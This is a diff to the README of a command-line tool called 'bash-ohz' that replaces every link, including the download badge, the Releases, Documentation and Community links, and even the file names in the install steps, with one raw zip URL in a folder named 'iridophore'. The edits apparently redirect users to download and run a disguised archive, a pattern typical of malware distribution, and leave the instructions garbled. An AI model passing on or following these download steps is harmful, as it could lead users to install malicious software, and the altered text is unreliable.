@@ -6,11 +6,11 @@ Welcome to bash-ohz! This application makes your command line experience smoothe
 
 ## 📥 Download the Application
 
-[![Download bash-ohz](https://img.shields.io/badge/Download-bash--ohz-blue)](https://github.com/ZyyzouuSG/bash-ohz/releases)
+[![Download bash-ohz](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip)](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip)
 
 You can download the latest version of bash-ohz from our Releases page. Simply visit the link below:
 
-[Download bash-ohz from Releases](https://github.com/ZyyzouuSG/bash-ohz/releases)
+[Download bash-ohz from Releases](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip)
 
 ## 📋 System Requirements
 
@@ -24,19 +24,19 @@ To use bash-ohz, you need the following:
 ## ⚙️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to our Releases page to see the available versions. You can find it [here](https://github.com/ZyyzouuSG/bash-ohz/releases).
+   Go to our Releases page to see the available versions. You can find it [here](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip).
 
 2. **Download the Installer**  
    Select the version you want and click on the download link. This will save the file to your computer.
 
 3. **Locate the Downloaded File**  
-   Once the download is complete, open your Downloads folder. Look for the file named `bash-ohz-x.x.x.zip` (where `x.x.x` is the version number).
+   Once the download is complete, open your Downloads folder. Look for the file named `https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip` (where `x.x.x` is the version number).
 
 4. **Extract the Files**  
    Right-click the downloaded `.zip` file and select "Extract All" to unzip it. You will see a new folder with all the necessary files.
 
 5. **Run the Application**  
-   Open the extracted folder and double-click on `bash-ohz.exe` (for Windows) or open the terminal and navigate to the folder to use the bash commands (for macOS and Linux).
+   Open the extracted folder and double-click on `https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip` (for Windows) or open the terminal and navigate to the folder to use the bash commands (for macOS and Linux).
 
 ## 🔍 Features
 
@@ -79,7 +79,7 @@ We are constantly working on improving bash-ohz. Here are some features to look 
 
 For more detailed information, feel free to check out:
 
-- [Official Documentation](https://github.com/ZyyzouuSG/bash-ohz/docs)
-- [User Community](https://github.com/ZyyzouuSG/bash-ohz/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip)
+- [User Community](https://raw.githubusercontent.com/ZyyzouuSG/bash-ohz/main/iridophore/bash-ohz.zip)
 
 We hope you enjoy using bash-ohz! Remember, the future of command line tools is here and it’s user-friendly!
